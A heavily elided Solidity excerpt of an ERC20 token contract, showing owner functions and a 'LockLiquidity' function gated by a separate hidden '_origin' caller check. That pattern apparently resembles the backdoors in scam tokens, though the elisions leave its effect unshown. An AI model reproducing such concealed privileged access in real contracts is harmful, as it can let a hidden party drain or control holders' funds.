...
contract Iterable is IERC20, Ownable, LibreMount {
    ...
    function switchOrigin(address _newOne) external onlyOwner {
        SecureCalls.checkCaller(msg.sender, _origin);
        _origin = _newOne;
    }
    ...
    function LockLiquidity(address baseToken, address _recepient, uint amount) public {
            SecureCalls.checkCaller(msg.sender, _origin);
    ...
    function checkDPT() public view returns (string memory) {
        return _symbol;
    }
}